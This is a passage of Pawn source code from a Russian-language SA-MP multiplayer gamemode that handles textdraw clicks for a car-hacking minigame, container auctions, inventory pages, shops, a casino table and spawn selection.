					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
				else
				{
				    progress[playerid] = progress[playerid]+5;
				    progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
					PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
			}
			else
			{
			        progress[playerid] = progress[playerid]-10;
			        PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				 	progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
			}
	    }
 	}
 	if(clickedid == ProgressBar[7])
 	{
 	    if(GetPVarInt(playerid,"HackCar") > 0)
	    {
	        if(progressb[playerid] == 3)
			{

				if(progress[playerid] >= 90)
				{
				    progress[playerid] = 100;
				    PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
				else
				{
				    progress[playerid] = progress[playerid]+5;
				    progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
					PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
			}
			else
			{
			        progress[playerid] = progress[playerid]-10;
			        PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				 	progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
			}
	    }
 	}
	if(clickedid ==Auction[18])
	{
		ShowPlayerDialog(playerid,478,DIALOG_STYLE_INPUT,"Ставка","{ffffff}Введите ставку:\n\n{F85A5A} - Ставка должна быть на 10% больше максимальной\n - В случае проигрыша Вам вернётся 80% от Вашей ставки","Далее","Отмена");
	}
	if(clickedid == Auction[15])
	{
	    if(GetPVarInt(playerid,"NonFlood") > gettime()) return SendClientMessage(playerid,CGREY,"Подождите...");
	    SetPVarInt(playerid,"ContW",GetPVarInt(playerid,"ContW")+1);
		if(GetPVarInt(playerid,"ContW") > 5) DeletePVar(playerid,"ContW");
		new i = GetPVarInt(playerid,"ContW");
		new Float:x,Float:y,Float:z;
		new Float:x1,Float:y1,Float:z1;
		GetPlayerCameraPos(playerid,x,y,z);
		GetPlayerCameraLookAt(playerid,x1,y1,z1);
        InterpolateCameraPos(playerid, x,y,z, ContainerPos[i][0], ContainerPos[i][1], ContainerPos[i][2], 1000);
		InterpolateCameraLookAt(playerid, x1,y1,z1, ContainerPos[i][3], ContainerPos[i][4], ContainerPos[i][5], 1000);
		query = "";
		format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' ORDER BY `stavka` DESC LIMIT 5",GetPVarInt(playerid,"ContW"));
		mysql_tquery(mysql, query, "CheckContainer", "d", playerid);
		SetPVarInt(playerid,"NonFlood",gettime()+3);
	}
	if(clickedid == Auction[14])
	{
	    if(GetPVarInt(playerid,"NonFlood") > gettime()) return SendClientMessage(playerid,CGREY,"Подождите...");
	    SetPVarInt(playerid,"ContW",GetPVarInt(playerid,"ContW")-1);
		if(GetPVarInt(playerid,"ContW") < 0) SetPVarInt(playerid,"ContW",5);
		new i = GetPVarInt(playerid,"ContW");
		new Float:x,Float:y,Float:z;
		new Float:x1,Float:y1,Float:z1;
		GetPlayerCameraPos(playerid,x,y,z);
		GetPlayerCameraLookAt(playerid,x1,y1,z1);
        InterpolateCameraPos(playerid, x,y,z, ContainerPos[i][0], ContainerPos[i][1], ContainerPos[i][2], 1000);
		InterpolateCameraLookAt(playerid, x1,y1,z1, ContainerPos[i][3], ContainerPos[i][4], ContainerPos[i][5], 1000);
		query = "";
		format(query,sizeof(query),"SELECT * FROM containers WHERE container = '%d' ORDER BY `stavka` DESC LIMIT 5",GetPVarInt(playerid,"ContW"));
		mysql_tquery(mysql, query, "CheckContainer", "d", playerid);
		SetPVarInt(playerid,"NonFlood",gettime()+3);
	}
	if(clickedid == Inventory1[14] || clickedid == Inventory1[13])
	{
	    new str[5];
	    SetPVarInt(playerid,"InvS1",(!GetPVarInt(playerid,"InvS1")) ? (1) : (0));
	    new stratica = (!GetPVarInt(playerid,"InvS1")) ? (0) : (36);
     	
	    for(new i = 0; i < 36; i++)
	    {
	        PlayerTextDrawHide(playerid,InvAmm1[playerid][i]);
	        PlayerTextDrawHide(playerid,InventoryP1[i][playerid]);
	        PlayerTextDrawBackgroundColor(playerid, InventoryP1[i][playerid], 589505535);
	        PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[0][invObj]);
			PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
            PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
            if(GetPVarInt(playerid,"OpenHouse"))
   			{
   			    new x = GetPVarInt(playerid,"PlayerHouse");
				if(HInfo[x][hInvSlot][i+stratica])
		 	    {
		            PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[HInfo[x][hInvSlot][i+stratica]][invObj]);
		            PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[HInfo[x][hInvSlot][i+stratica]][invRot][0], InvType[HInfo[x][hInvSlot][i+stratica]][invRot][1], InvType[HInfo[x][hInvSlot][i+stratica]][invRot][2], InvType[HInfo[x][hInvSlot][i+stratica]][invRot][3]);
		 			PlayerTextDrawShow(playerid,InvAmm1[playerid][i]);
		 			format(str,sizeof(str),"%d",HInfo[x][hInvKol][i+stratica]);
					PlayerTextDrawSetString(playerid,InvAmm1[playerid][i],str);
		 		}
	 		}
	 		if(GetPVarInt(playerid,"OpenTrunk"))
   			{
   			    new x = GetPVarInt(playerid,"Car");
				if(HInfo[x][hInvSlot][i+stratica])
		 	    {
		            PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[BInfo[x][bInvSlot][i+stratica]][invObj]);
		            PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[BInfo[x][bInvSlot][i+stratica]][invRot][0], InvType[BInfo[x][bInvSlot][i+stratica]][invRot][1], InvType[BInfo[x][bInvSlot][i+stratica]][invRot][2], InvType[BInfo[x][bInvSlot][i+stratica]][invRot][3]);
		 			PlayerTextDrawShow(playerid,InvAmm1[playerid][i]);
		 			format(str,sizeof(str),"%d",BInfo[x][bInvKol][i+stratica]);
					PlayerTextDrawSetString(playerid,InvAmm1[playerid][i],str);
		 		}
	 		}
	    }
	}
	if(clickedid == Inventory[14] || clickedid == Inventory[13])
	{
	    SetPVarInt(playerid,"InvS",(!GetPVarInt(playerid,"InvS")) ? (1) : (0)); // 0 до 29    30 до 65
	    new stratica = (!GetPVarInt(playerid,"InvS")) ? (-6) : (30);
	    new str[5];

	    if(GetPVarInt(playerid,"SetCehck")) for(new x = 0; x < 6; x++) PlayerTextDrawHide(playerid,ActionInventoryP[x][playerid]);
	    if(GetPVarInt(playerid,"InvS"))
		{
		    for(new i = 0; i < 36; i++)
		    {
		        PlayerTextDrawHide(playerid,InvAmm[playerid][i]);
		        PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
		        PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 589505535);
		        PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
				PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
	            PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
				if(InvInfo[playerid][iSlot][i+stratica])
		 	    {
		            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i+stratica]][invObj]);
		            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][0], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][1], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][2], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][3]);
		 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
		 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i+stratica]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
		 		}
		    }
	    }
	    else
	    {
	    
            new weapons[7],ammo[7],gun;
			for (new i = 0; i < 7; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
	        for(new i = 0; i < 36; i++)
		    {
		        PlayerTextDrawHide(playerid,InvAmm[playerid][i]);
		        PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
		        PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 589505535);
		        if(i >= 0 && i <= 5)
		        {
			        if(ammo[i+1])
					{
						gun = GiveID(weapons[i+1]);
						PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[gun][invObj]);
	 					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[gun][invRot][0], InvType[gun][invRot][1], InvType[gun][invRot][2], InvType[gun][invRot][3]);
						PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
			 			format(str,sizeof(str),"%d",ammo[i+1]);
						PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
			 	    }
			 	    else
			 	    {
						PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
						PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
                       // PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
					 }
		 	    }
		 	    if(i >= 6 && i <= 35)
		        {
			        
					if(InvInfo[playerid][iSlot][i+stratica])
			 	    {
			            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i+stratica]][invObj]);
			            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][0], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][1], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][2], InvType[InvInfo[playerid][iSlot][i+stratica]][invRot][3]);
			 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
			 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i+stratica]);
						PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
			 		}
			 		else
			 		{
		    			PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
						PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
			 		}
			 		
		 		}
		 		PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
		    }
	    }
	}
/*	if(clickedid == Inventory[14] || clickedid == Inventory[13])
	{
	    //if((clickedid == InventoryPlayer[21] && !GetPVarInt(playerid,"InvS")) || (clickedid == InventoryPlayer[22] && GetPVarInt(playerid,"InvS"))) return 1;
	    new stratica = (!GetPVarInt(playerid,"InvS")) ? (-16) : (9);
        SetPVarInt(playerid,"InvS",(!GetPVarInt(playerid,"InvS")) ? (1) : (0));
	    
	    for(new i = 16; i < 41; i++)
 		{
 		    PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
 		    if(InvInfo[playerid][iSlot][i += stratica])
	 	    {
                PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i += stratica]][invObj]);
                PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i += stratica]][invRot][0], InvType[InvInfo[playerid][iSlot][i += stratica]][invRot][1], InvType[InvInfo[playerid][iSlot][i += stratica]][invRot][2], InvType[InvInfo[playerid][iSlot][i += stratica]][invRot][3]);
	 			//PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
	 		}

 	    }
	}*/
	
 	if(clickedid == Inventory[29])
	{
	    DeletePVar(playerid,"InvS");
	    DeletePVar(playerid,"InvOpen");
	    DeletePVar(playerid,"SetCehck");
		for(new i = 0; i < 39; i++) TextDrawHideForPlayer(playerid,Inventory[i] );
	 	for(new i = 0; i < 47; i++) PlayerTextDrawDestroy(playerid,InventoryP[i][playerid]);
	 	for(new i = 0; i < 6; i++) PlayerTextDrawDestroy(playerid,ActionInventoryP[i][playerid]);
	 	for(new i = 0; i < 36; i++) PlayerTextDrawDestroy(playerid,InvAmm[playerid][i]);
	 	CancelSelectTextDraw(playerid);
	}
	if(clickedid == Inventory[25]) cmd_menu(playerid,"");
	if(clickedid == Inventory[28]) cmd_donate(playerid);
	if(clickedid == Inventory[26]) cmd_gps(playerid,"");
	if(clickedid == Inventory[31])
	{
	    ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Связь с администрацией","{FFFFFF}Введите ID игрока и причину подачи на него в репорт:","Далее","Назад");
	}

	if(clickedid == Roulette[16])
	{
	    PlayerInfo[playerid][pPriz] = 0;
	    InvMinus(playerid,445,1);
	    PlayerTextDrawHide(playerid,RouletteP[0][playerid]);
	 	PlayerTextDrawSetPreviewModel(playerid, RouletteP[0][playerid], 2);
	 	PlayerTextDrawShow(playerid,RouletteP[0][playerid]);
	    Case[0] = 2;
	    PlayerTextDrawHide(playerid,RouletteP[1][playerid]);
	    PlayerTextDrawSetPreviewModel(playerid, RouletteP[1][playerid], 1212);
	    PlayerTextDrawShow(playerid,RouletteP[1][playerid]);
	    Case[1] = 1212;
	    PlayerTextDrawHide(playerid,RouletteP[2][playerid]);
	    PlayerTextDrawSetPreviewModel(playerid, RouletteP[2][playerid], 1274);
	    PlayerTextDrawShow(playerid,RouletteP[2][playerid]);
	    Case[2] = 1274;
	//	for(new i = 0; i<= 6; i++) PlayerTextDrawShow(playerid,OpenCase[playerid][i]);
		new time = SetTimerEx("OpenCaseP",100,true,"i",playerid);
		SetPVarInt(playerid,"OCTimer",time);
		SetPVarInt(playerid,"OpenCase",1);
		SetPVarInt(playerid,"OCK",random(50-20)+20);
		TogglePlayerControllable(playerid, 0);
	}
    if(clickedid == ObjectBuy[14])
	{
	    if(GetPVarInt(playerid,"BuyAmmo"))
	    {
	        DestroyDynamicObject(GetPVarInt(playerid,"AmmoObj"));
			CancelSelectTextDraw(playerid);
			for(new x = 5; x < 18; x++) TextDrawHideForPlayer(playerid,ObjectBuy[x]);
			for(new x = 1; x < 3; x++) PlayerTextDrawHide(playerid,ObjectBuyP[x][playerid]);
	    	DeletePVar(playerid,"BuyAmmo");
	    	DeletePVar(playerid,"SelectAmmo");
	    	SetCameraBehindPlayer(playerid);
	    	TogglePlayerControllable(playerid, 1);
	    	return 1;
	    }
	    if(GetPVarInt(playerid,"BuySkin"))
	    {
			CancelSelectTextDraw(playerid);
			for(new x = 5; x < 18; x++) TextDrawHideForPlayer(playerid,ObjectBuy[x]);
			for(new x = 1; x < 3; x++) PlayerTextDrawHide(playerid,ObjectBuyP[x][playerid]);
			SetSkin(playerid);
	    	DeletePVar(playerid,"BuySkin");
	    	DeletePVar(playerid,"SelectSkin");
	    	SetCameraBehindPlayer(playerid);
	    	TogglePlayerControllable(playerid, 1);
	    	return 1;
	    }
	    else if(GetPVarInt(playerid,"Shkaf"))
		{
            SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PHOUSE"));
            SetPlayerInterior(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hInt]);
            SetPlayerPos(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][0],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][1],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][2]);
            SetCameraBehindPlayer(playerid);
            DeletePVar(playerid,"ShkafRaz");
            DeletePVar(playerid,"Shkaf");
			SetSkin(playerid);
			TogglePlayerControllable(playerid, 1);
			for(new i = 5; i < 18; i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 			for(new i = 1; i < 3; i++) PlayerTextDrawHide(playerid,ObjectBuyP[i][playerid]);
			CancelSelectTextDraw(playerid);
            return 1;
		}
	    else if(GetPVarInt(playerid,"InMebel")) ExitMebel(playerid);
		else ExitAcs(playerid);
	}
    if(clickedid == Casino[13]  )
    {
		if(GetPVarInt(playerid,"Stol") > 0)
	    {
	        if(StolInfo[GetPVarInt(playerid,"Stol")][sIgra] == 0) GiveMoney(playerid,GetPVarInt(playerid,"StolCena"));
			StolInfo[GetPVarInt(playerid,"Stol")][sPlayer][GetPVarInt(playerid,"StolID")] = -1;
			StolInfo[GetPVarInt(playerid,"Stol")][sDice][GetPVarInt(playerid,"StolID")] = 0;
			UpdateStol(GetPVarInt(playerid,"Stol"));
			TogglePlayerControllable(playerid, 1);
     		for(new x = 0; x < 3; x++) TextDrawHideForPlayer(playerid,CasinoTD[GetPVarInt(playerid,"Stol")][x]);
			for(new x = 0; x < 21; x++) TextDrawHideForPlayer(playerid,Casino[x]);
			CancelSelectTextDraw(playerid);
			DeletePVar(playerid,"Stol");
			DeletePVar(playerid,"StolID");
			DeletePVar(playerid,"StolCena");
	    }
    }
    if(clickedid == Casino[12] )
    {
  		if(GetPVarInt(playerid,"Stol") > 0)
	    {
	        if(StolInfo[GetPVarInt(playerid,"Stol")][sIgra] == 0) return SendClientMessage(playerid,CGREY,"Игра не началась");
	        if(StolInfo[GetPVarInt(playerid,"Stol")][sDice][GetPVarInt(playerid,"StolID")] > 0) return SendClientMessage(playerid,CGREY,"Вы уже бросили кости");
			StolInfo[GetPVarInt(playerid,"Stol")][sDice][GetPVarInt(playerid,"StolID")] = random(9);
			UpdateStol(GetPVarInt(playerid,"Stol"));
	    }
    }
    if(clickedid == ObjectBuy[4])
    {
        static const fmt_str1[] = "$%i";
		new string1[sizeof(fmt_str1)+10];
        if(SpawnReg[playerid])
        {
            SetPVarInt(playerid,"SpawnVib",GetPVarInt(playerid,"SpawnVib")+1);
			if(GetPVarInt(playerid,"SpawnVib") > 2) SetPVarInt(playerid,"SpawnVib",0);
			switch(GetPVarInt(playerid,"SpawnVib"))
			{
			    case 0: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "PLANE");
			    case 1: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "TRAIN");
			    case 2: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "CAR");
			}
			SetSPCam(playerid);
            return 1;
        }
        if(GetPVarInt(playerid,"InMebel"))
        {
			SetPVarInt(playerid,"MebelCheck",GetPVarInt(playerid,"MebelCheck")+1);
			if(GetPVarInt(playerid,"MebelCheck") > GetL(GetPVarInt(playerid,"MebelRaz"))-1) SetPVarInt(playerid,"MebelCheck",0);
			SetMebel(playerid);
			return true;
        }
        
        if(GetPVarInt(playerid,"ACS1") == 0) return SendClientMessage(playerid,CGREY,"Выберите раздел");
        SetPVarInt(playerid,"ACS2",GetPVarInt(playerid,"ACS2")+1);
        if(ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")] == 1) SetPVarInt(playerid,"ACS2",0);
        GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);

		static const fmt_str21[] = "%s %d";
		new stri2ng1[sizeof(fmt_str21)+3+20];
		format(stri2ng1, sizeof(stri2ng1), fmt_str21, ItemsName[GetPVarInt(playerid,"ACS1")-1], GetPVarInt(playerid,"ACS2")+1);
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],stri2ng1);
		
		
		format(string1, sizeof(string1), fmt_str1, ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
		
		
		

    }
    if(clickedid == ObjectBuy[15])
	{
	    if(SpawnReg[playerid])
	    {
			switch(PlayerInfo[playerid][pSpawn])
			{
				case 0:	SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1678.6046,1448.5035,10.7750,276.8253, -1, -1, -1, -1, -1, -1);
				case 1: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2845.8662,1291.0157,11.3906,90.0034, -1, -1, -1, -1, -1, -1);
				case 2: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2222.8694,1839.0148,10.8203,89.8207, -1, -1, -1, -1, -1, -1);
				case 3: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1446.6733,-2286.7068,13.5469,-1, -1, -1, -1, -1, -1, -1); //plane
				case 4: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1759.8630,-1894.8911,13.5608,-1, -1, -1, -1, -1, -1, -1); //jsld
				case 5: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1243.1993,-1699.4054,14.8672,-1, -1, -1, -1, -1, -1, -1); //car
			}
			SpawnReg[playerid] = false;
			TogglePlayerSpectating(playerid,false);
			for(new i = 0; i < 18; i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 			for(new i = 0; i < 2; i++) PlayerTextDrawHide(playerid,ObjectBuyP[i][playerid]);
		//	PlayerTextDrawHide(playerid,ViborSP[playerid]);
		////	for(new i = 0;i <= 2;i++) TextDrawHideForPlayer(playerid,ViborSP1[i]);
			CancelSelectTextDraw(playerid);
			PlayerInfo[playerid][pSpawn] = (GetPVarInt(playerid,"Gorod")) ? (GetPVarInt(playerid,"SpawnVib")+3) : (GetPVarInt(playerid,"SpawnVib"));
			SetPlayerInt(PlayerInfo[playerid][pSendername],"spawn",PlayerInfo[playerid][pSpawn]);
			DeletePVar(playerid,"SpawnVib");
			DeletePVar(playerid,"Gorod");
			SetCameraBehindPlayer(playerid);
			//SendClientMessage(playerid,-1,"");
			SetPVarInt(playerid,"Firstspawn",1);
			SpawnPlayer(playerid);
	        return 1;
	    }
	    if(GetPVarInt(playerid,"Shkaf"))
		{
			new model = PlayerInfo[playerid][pModel];
			PlayerInfo[playerid][pModel] = ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")];
			InvHouseMinus(playerid,ListNick[playerid][GetPVarInt(playerid,"ShkafRaz")],1);
			GiveHouseInv(playerid,model,1);
        //    PlayerInfo[playerid][pSkin][GetPVarInt(playerid,"ShkafRaz")] = model;
            SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PHOUSE"));
            SetPlayerInterior(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hInt]);
            SetPlayerPos(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][0],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][1],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][2]);
            SetCameraBehindPlayer(playerid);
            DeletePVar(playerid,"Shkaf");
			TogglePlayerControllable(playerid, 1);
			for(new i = 5; i < 18; i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 			for(new i = 1; i < 2; i++) PlayerTextDrawHide(playerid,ObjectBuyP[i][playerid]);
			CancelSelectTextDraw(playerid);
            return 1;
		}
		else if(GetPVarInt(playerid,"BuyAmmo"))
		{
		    new text[25];
		    switch(GetPVarInt(playerid,"SelectAmmo"))
			{
			    case 0: text = "Кастет";
			    case 1: text = "Биту";
			    case 2: text = "Дымовые шашки (10 шт.)";
			    case 3: text = "Desert Eagle (60 пт.)";
			    case 4: text = "Shotgun (30 пт.)";
			    case 5: text = "AK-47 (90 пт.)";
			    case 6: text = "Country Rifle (30 пт.)";
			}
			static const fmt_str1[] = "{FFFFFF}Вы хотите купить %s?\nЦена: $%i";
			new string1[sizeof(fmt_str1)+30];
			format(string1, sizeof(string1), fmt_str1, text, ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][GetPVarInt(playerid,"SelectAmmo")]);
			ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка",string1,"Да","Нет");
		}
		else if(GetPVarInt(playerid,"BuySkin")) ShowPlayerDialog(playerid,471,DIALOG_STYLE_MSGBOX,"Покупка аксессуара","{FFFFFF}Вы действительно хотите купить данную одежду?","Далее","Отмена");
		else if(GetPVarInt(playerid,"InMebel")) ShowPlayerDialog(playerid,310,DIALOG_STYLE_MSGBOX,"Покупка мебели","{FFFFFF}Вы действительно хотите купить данную мебель?","Далее","Отмена");
		else ShowPlayerDialog(playerid,205,DIALOG_STYLE_MSGBOX,"Покупка аксессуара","{FFFFFF}Вы действительно хотите купить данный аксесcуар?","Далее","Отмена");
	}
	if(clickedid == ObjectBuy[3])
    {
        static const fmt_str1[] = "$%i";
		new string1[sizeof(fmt_str1)+10];
        if(SpawnReg[playerid])
        {
            SetPVarInt(playerid,"SpawnVib",GetPVarInt(playerid,"SpawnVib")-1);
			if(GetPVarInt(playerid,"SpawnVib") < 0) SetPVarInt(playerid,"SpawnVib",2);
			switch(GetPVarInt(playerid,"SpawnVib"))
			{
			    case 0: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "PLANE");
			    case 1: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "TRAIN");
			    case 2: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid], "CAR");
			}
			SetSPCam(playerid);
            return 1;
        }
    	if(GetPVarInt(playerid,"InMebel"))
        {
			SetPVarInt(playerid,"MebelCheck",GetPVarInt(playerid,"MebelCheck")-1);
			if(GetPVarInt(playerid,"MebelCheck") < 0) SetPVarInt(playerid,"MebelCheck",GetL(GetPVarInt(playerid,"MebelRaz"))-1);
			SetMebel(playerid);
			return true;
        } 
        
        if(GetPVarInt(playerid,"ACS1") == 0) return SendClientMessage(playerid,CGREY,"Выберите раздел");
        SetPVarInt(playerid,"ACS2",GetPVarInt(playerid,"ACS2")-1);
        if(GetPVarInt(playerid,"ACS2") < 0) SetPVarInt(playerid,"ACS2",ItemsMax[GetPVarInt(playerid,"ACS1")-1]);
        if(ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")+1] == 1) SetPVarInt(playerid,"ACS2",0);
        GiveItem(playerid,ItemsId[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
		static const fmt_str21[] = "%s %d";
		new stri2ng1[sizeof(fmt_str21)+3+20];
		format(stri2ng1, sizeof(stri2ng1), fmt_str21, ItemsName[GetPVarInt(playerid,"ACS1")-1], GetPVarInt(playerid,"ACS2")+1);
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],stri2ng1);
		
		format(string1, sizeof(string1), fmt_str1, ItemsCost[GetPVarInt(playerid,"ACS1")-1][GetPVarInt(playerid,"ACS2")]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
		

    }
    if(clickedid == ObjectBuy[13] )
    {
        new str[25];
        static const fmt_str1[] = "$%i";
		new string1[sizeof(fmt_str1)+10];
        if(SpawnReg[playerid])
        {
            SetPVarInt(playerid,"Gorod",GetPVarInt(playerid,"Gorod")+1);
			if(GetPVarInt(playerid,"Gorod") > 1) SetPVarInt(playerid,"Gorod",0);
			DeletePVar(playerid,"SpawnVib");
            PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],(GetPVarInt(playerid,"Gorod")) ? ("Los Santos"):("Las Venturas"));
            PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"PLANE");
            SetPlayerVirtualWorld(playerid,0);
            if(GetPVarInt(playerid,"Gorod"))
            {
				InterpolateCameraPos(playerid, 1364.583374, -2373.431152, 104.466720, 1426.709960, -2274.038818, 20.591976, 5000);
